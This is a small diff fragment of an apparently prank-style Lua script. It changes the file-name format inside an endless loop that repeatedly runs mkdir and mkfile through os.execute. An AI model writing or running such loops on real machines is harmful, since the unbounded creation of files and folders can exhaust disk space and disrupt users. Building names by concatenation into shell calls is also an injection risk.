@@ -6,7 +6,7 @@ end
 
 while true do
 	coroutine.wrap(function()
-		local name = 'girlfromsweden' .. i
+		local name = ('girlfromsweden%d.txt'):format(i)
 
 		os.execute('mkdir ' .. name)
 		os.execute('mkfile ' .. name)
